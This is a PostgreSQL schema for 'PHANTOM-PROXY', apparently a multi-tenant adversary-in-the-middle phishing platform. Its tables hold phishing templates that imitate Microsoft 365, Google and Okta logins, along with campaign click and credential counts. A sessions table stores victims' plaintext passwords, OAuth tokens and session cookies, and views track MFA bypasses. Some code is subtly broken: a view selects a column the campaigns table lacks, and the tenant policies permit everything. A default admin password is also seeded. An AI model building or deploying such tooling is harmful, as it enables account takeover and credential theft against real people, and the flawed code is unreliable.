-- PHANTOM-PROXY v14.0 - PostgreSQL Schema
-- Multi-tenant, RLS, FSTEC compliant

-- Enable extensions
CREATE EXTENSION IF NOT EXISTS "uuid-ossp";
CREATE EXTENSION IF NOT EXISTS "pgcrypto";
CREATE EXTENSION IF NOT EXISTS "timescaledb";

-- ============================================================================
-- TENANT MANAGEMENT (Multi-tenant)
-- ============================================================================

CREATE TABLE tenants (
    id UUID PRIMARY KEY DEFAULT uuid_generate_v4(),
    name VARCHAR(255) NOT NULL,
    slug VARCHAR(100) UNIQUE NOT NULL,
    domain VARCHAR(255),
    plan VARCHAR(50) DEFAULT 'free', -- free, pro, enterprise
    settings JSONB DEFAULT '{}',
    created_at TIMESTAMPTZ DEFAULT NOW(),
    updated_at TIMESTAMPTZ DEFAULT NOW(),
    deleted_at TIMESTAMPTZ
);

-- Row Level Security
ALTER TABLE tenants ENABLE ROW LEVEL SECURITY;

CREATE POLICY "tenants_select" ON tenants
    FOR SELECT USING (true);

CREATE POLICY "tenants_insert" ON tenants
    FOR INSERT WITH CHECK (true);

CREATE POLICY "tenants_update" ON tenants
    FOR UPDATE USING (true);

-- ============================================================================
-- USERS
-- ============================================================================

CREATE TABLE users (
    id UUID PRIMARY KEY DEFAULT uuid_generate_v4(),
    tenant_id UUID REFERENCES tenants(id) ON DELETE CASCADE,
    email VARCHAR(255) NOT NULL,
    password_hash VARCHAR(255),
    role VARCHAR(50) DEFAULT 'user', -- admin, user, viewer
    mfa_enabled BOOLEAN DEFAULT false,
    mfa_secret VARCHAR(255),
    last_login TIMESTAMPTZ,
    created_at TIMESTAMPTZ DEFAULT NOW(),
    updated_at TIMESTAMPTZ DEFAULT NOW(),
    deleted_at TIMESTAMPTZ,
    UNIQUE(tenant_id, email)
);

CREATE INDEX idx_users_tenant ON users(tenant_id);
CREATE INDEX idx_users_email ON users(email);

-- RLS
ALTER TABLE users ENABLE ROW LEVEL SECURITY;

CREATE POLICY "users_tenant_select" ON users
    FOR SELECT USING (tenant_id = current_setting('app.tenant_id')::uuid);

CREATE POLICY "users_tenant_insert" ON users
    FOR INSERT WITH CHECK (tenant_id = current_setting('app.tenant_id')::uuid);

CREATE POLICY "users_tenant_update" ON users
    FOR UPDATE USING (tenant_id = current_setting('app.tenant_id')::uuid);

-- ============================================================================
-- PHSIHLETS
-- ============================================================================

CREATE TABLE phishlets (
    id UUID PRIMARY KEY DEFAULT uuid_generate_v4(),
    tenant_id UUID REFERENCES tenants(id) ON DELETE CASCADE,
    name VARCHAR(100) NOT NULL,
    domain VARCHAR(255) NOT NULL,
    provider VARCHAR(50) NOT NULL, -- microsoft365, google, okta, etc.
    version VARCHAR(20) DEFAULT '1.0',
    html_template TEXT,
    js_template TEXT,
    auth_url TEXT,
    token_url TEXT,
    is_active BOOLEAN DEFAULT true,
    created_at TIMESTAMPTZ DEFAULT NOW(),
    updated_at TIMESTAMPTZ DEFAULT NOW(),
    UNIQUE(tenant_id, name)
);

CREATE INDEX idx_phishlets_tenant ON phishlets(tenant_id);
CREATE INDEX idx_phishlets_provider ON phishlets(provider);

-- RLS
ALTER TABLE phishlets ENABLE ROW LEVEL SECURITY;
CREATE POLICY "phishlets_tenant" ON phishlets FOR ALL USING (tenant_id = current_setting('app.tenant_id')::uuid);

-- ============================================================================
-- CAMPAIGNS
-- ============================================================================

CREATE TABLE campaigns (
    id UUID PRIMARY KEY DEFAULT uuid_generate_v4(),
    tenant_id UUID REFERENCES tenants(id) ON DELETE CASCADE,
    name VARCHAR(255) NOT NULL,
    description TEXT,
    status VARCHAR(50) DEFAULT 'draft', -- draft, scheduled, running, paused, completed
    phishlet_id UUID REFERENCES phishlets(id),
    scheduled_at TIMESTAMPTZ,
    started_at TIMESTAMPTZ,
    completed_at TIMESTAMPTZ,
    target_count INTEGER DEFAULT 0,
    sent_count INTEGER DEFAULT 0,
    open_count INTEGER DEFAULT 0,
    click_count INTEGER DEFAULT 0,
    cred_count INTEGER DEFAULT 0,
    created_by UUID REFERENCES users(id),
    created_at TIMESTAMPTZ DEFAULT NOW(),
    updated_at TIMESTAMPTZ DEFAULT NOW()
);

CREATE INDEX idx_campaigns_tenant ON campaigns(tenant_id);
CREATE INDEX idx_campaigns_status ON campaigns(status);

-- RLS
ALTER TABLE campaigns ENABLE ROW LEVEL SECURITY;
CREATE POLICY "campaigns_tenant" ON campaigns FOR ALL USING (tenant_id = current_setting('app.tenant_id')::uuid);

-- ============================================================================
-- SESSIONS (captured credentials/sessions)
-- ============================================================================

CREATE TABLE sessions (
    id UUID PRIMARY KEY DEFAULT uuid_generate_v4(),
    tenant_id UUID REFERENCES tenants(id) ON DELETE CASCADE,
    campaign_id UUID REFERENCES campaigns(id),
    phishlet_id UUID REFERENCES phishlets(id),
    target_email VARCHAR(255),
    ip_address INET,
    user_agent TEXT,
    country VARCHAR(2),
    city VARCHAR(100),
    -- Credentials
    username TEXT,
    password TEXT,
    -- Tokens
    access_token TEXT,
    refresh_token TEXT,
    id_token TEXT,
    session_cookie TEXT,
    -- MFA
    mfa_bypassed BOOLEAN DEFAULT false,
    mfa_type VARCHAR(50),
    -- Status
    status VARCHAR(50) DEFAULT 'active', -- active, expired, revoked
    created_at TIMESTAMPTZ DEFAULT NOW(),
    updated_at TIMESTAMPTZ DEFAULT NOW(),
    expires_at TIMESTAMPTZ
);

CREATE INDEX idx_sessions_tenant ON sessions(tenant_id);
CREATE INDEX idx_sessions_campaign ON sessions(campaign_id);
CREATE INDEX idx_sessions_email ON sessions(target_email);
CREATE INDEX idx_sessions_status ON sessions(status);
CREATE INDEX idx_sessions_created ON sessions(created_at DESC);

-- RLS
ALTER TABLE sessions ENABLE ROW LEVEL SECURITY;
CREATE POLICY "sessions_tenant" ON sessions FOR ALL USING (tenant_id = current_setting('app.tenant_id')::uuid);

-- ============================================================================
-- THREAT INTELLIGENCE (TimescaleDB for analytics)
-- ============================================================================

CREATE TABLE threat_events (
    time TIMESTAMPTZ NOT NULL,
    tenant_id UUID,
    event_type VARCHAR(50),
    severity VARCHAR(20),
    source_ip INET,
    target_email VARCHAR(255),
    campaign_id UUID,
    phishlet_id UUID,
    metadata JSONB
);

SELECT create_hypertable('threat_events', 'time');

CREATE INDEX idx_threat_events_tenant_time ON threat_events(tenant_id, time DESC);
CREATE INDEX idx_threat_events_type ON threat_events(event_type);

-- ============================================================================
-- ANALYTICS (Materialized Views)
-- ============================================================================

CREATE MATERIALIZED VIEW campaign_stats AS
SELECT
    c.id as campaign_id,
    c.name as campaign_name,
    c.status,
    c.provider,
    COUNT(s.id) as total_sessions,
    COUNT(CASE WHEN s.mfa_bypassed THEN 1 END) as mfa_bypassed,
    COUNT(DISTINCT s.ip_address) as unique_ips,
    COUNT(DISTINCT s.target_email) as unique_targets,
    MIN(s.created_at) as first_capture,
    MAX(s.created_at) as last_capture
FROM campaigns c
LEFT JOIN sessions s ON s.campaign_id = c.id
GROUP BY c.id, c.name, c.status, c.provider
WITH DATA;

CREATE UNIQUE INDEX idx_campaign_stats ON campaign_stats(campaign_id);

REFRESH MATERIALIZED VIEW CONCURRENTLY campaign_stats;

-- ============================================================================
-- FSTEC COMPLIANCE - AUDIT LOG
-- ============================================================================

CREATE TABLE audit_log (
    id UUID PRIMARY KEY DEFAULT uuid_generate_v4(),
    tenant_id UUID REFERENCES tenants(id),
    user_id UUID REFERENCES users(id),
    action VARCHAR(100) NOT NULL,
    entity_type VARCHAR(50),
    entity_id UUID,
    old_values JSONB,
    new_values JSONB,
    ip_address INET,
    user_agent TEXT,
    created_at TIMESTAMPTZ DEFAULT NOW()
);

CREATE INDEX idx_audit_log_tenant ON audit_log(tenant_id, created_at DESC);
CREATE INDEX idx_audit_log_user ON audit_log(user_id, created_at DESC);

-- FSTEC: Encrypt sensitive fields
ALTER TABLE sessions ADD COLUMN IF NOT EXISTS encrypted_data BYTEA;

-- Function to encrypt data (GOST)
CREATE OR REPLACE FUNCTION encrypt_gost(data TEXT, key BYTEA)
RETURNS BYTEA AS $$
BEGIN
    RETURN pgp_sym_encrypt(data, key, 'compress-algo=1, cipher-algo=gost');
END;
$$ LANGUAGE plpgsql SECURITY DEFINER;

-- Function to decrypt data
CREATE OR REPLACE FUNCTION decrypt_gost(data BYTEA, key BYTEA)
RETURNS TEXT AS $$
BEGIN
    RETURN pgp_sym_decrypt(data, key);
END;
$$ LANGUAGE plpgsql SECURITY DEFINER;

-- ============================================================================
-- API KEYS
-- ============================================================================

CREATE TABLE api_keys (
    id UUID PRIMARY KEY DEFAULT uuid_generate_v4(),
    tenant_id UUID REFERENCES tenants(id) ON DELETE CASCADE,
    name VARCHAR(100) NOT NULL,
    key_hash VARCHAR(255) NOT NULL,
    permissions JSONB DEFAULT '["read"]',
    last_used TIMESTAMPTZ,
    expires_at TIMESTAMPTZ,
    created_at TIMESTAMPTZ DEFAULT NOW(),
    deleted_at TIMESTAMPTZ
);

CREATE INDEX idx_api_keys_tenant ON api_keys(tenant_id);
CREATE INDEX idx_api_keys_hash ON api_keys(key_hash);

-- RLS
ALTER TABLE api_keys ENABLE ROW LEVEL SECURITY;
CREATE POLICY "api_keys_tenant" ON api_keys FOR ALL USING (tenant_id = current_setting('app.tenant_id')::uuid);

-- ============================================================================
-- FUNCTIONS
-- ============================================================================

-- Set tenant context
CREATE OR REPLACE FUNCTION set_tenant(tenant_uuid UUID)
RETURNS VOID AS $$
BEGIN
    PERFORM set_config('app.tenant_id', tenant_uuid::text, true);
END;
$$ LANGUAGE plpgsql SECURITY DEFINER;

-- Update timestamp trigger
CREATE OR REPLACE FUNCTION update_updated_at()
RETURNS TRIGGER AS $$
BEGIN
    NEW.updated_at = NOW();
    RETURN NEW;
END;
$$ LANGUAGE plpgsql;

-- Apply triggers
CREATE TRIGGER update_tenants_updated
    BEFORE UPDATE ON tenants
    FOR EACH ROW EXECUTE FUNCTION update_updated_at();

CREATE TRIGGER update_users_updated
    BEFORE UPDATE ON users
    FOR EACH ROW EXECUTE FUNCTION update_updated_at();

CREATE TRIGGER update_phishlets_updated
    BEFORE UPDATE ON phishlets
    FOR EACH ROW EXECUTE FUNCTION update_updated_at();

CREATE TRIGGER update_campaigns_updated
    BEFORE UPDATE ON campaigns
    FOR EACH ROW EXECUTE FUNCTION update_updated_at();

CREATE TRIGGER update_sessions_updated
    BEFORE UPDATE ON sessions
    FOR EACH ROW EXECUTE FUNCTION update_updated_at();

-- ============================================================================
-- VIEWS
-- ============================================================================

-- Dashboard view
CREATE OR REPLACE VIEW dashboard_stats AS
SELECT
    t.id as tenant_id,
    t.name as tenant_name,
    COUNT(DISTINCT c.id) as total_campaigns,
    COUNT(DISTINCT s.id) as total_captures,
    COUNT(DISTINCT CASE WHEN s.mfa_bypassed THEN s.id END) as mfa_bypasses,
    COUNT(DISTINCT s.ip_address) as unique_attacks,
    COALESCE(SUM(c.sent_count), 0) as total_emails_sent,
    COALESCE(SUM(c.click_count), 0) as total_clicks,
    ROUND(
        CASE
            WHEN SUM(c.sent_count) > 0
            THEN SUM(c.click_count)::numeric / SUM(c.sent_count) * 100
            ELSE 0
        END, 2
    ) as click_rate
FROM tenants t
LEFT JOIN campaigns c ON c.tenant_id = t.id
LEFT JOIN sessions s ON s.tenant_id = t.id
WHERE t.deleted_at IS NULL
GROUP BY t.id, t.name;

-- ============================================================================
-- SEEDS
-- ============================================================================

-- Default tenant
INSERT INTO tenants (id, name, slug, domain, plan)
VALUES (
    '00000000-0000-0000-0000-000000000001',
    'Default Organization',
    'default',
    'phantom.local',
    'enterprise'
) ON CONFLICT (slug) DO NOTHING;

-- Default admin user (password: phantom2024)
INSERT INTO users (id, tenant_id, email, password_hash, role)
VALUES (
    '00000000-0000-0000-0000-000000000002',
    '00000000-0000-0000-0000-000000000001',
    'admin@phantom.local',
    crypt('phantom2024', gen_salt('bf')),
    'admin'
) ON CONFLICT (tenant_id, email) DO NOTHING;
